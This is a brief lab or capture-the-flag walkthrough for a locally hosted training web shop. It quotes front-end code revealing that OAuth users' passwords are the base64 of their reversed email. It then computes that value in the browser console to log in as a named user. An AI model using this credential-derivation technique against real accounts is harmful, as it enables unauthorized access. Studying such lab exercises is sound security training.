# Solution

Find email address under `http://127.0.0.1:3000/#/administration` and found his full emails



From reading `main.js` we found

```js
ngOnInit() {
    this.userService.oauthLogin(this.parseRedirectUrlParams().access_token).subscribe({
        next: e => {
            let i = btoa(e.email.split("").reverse().join("")); // New password ~ base64(reverse(email))
            this.userService.save({
                email: e.email,
                password: i,
                passwordRepeat: i
            }).subscribe({
                next: () => {
                    this.login(e)
                }
                ,
                error: () => {
                    this.login(e)
                }
            })
        }
        ,
        error: e => {
            this.invalidateSession(e),
            this.ngZone.run( () => Pe(this, null, function*() {
                return yield this.router.navigate(["/login"])
            }))
        }
    })
}
```

Put function in `console`

```js
let bjo = "bjoern.kimminich@gmail.com"

btoa(bjo.split("").reverse().join(""));
>> bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=
```

For some reason I don't understand I used these credentials to log-in...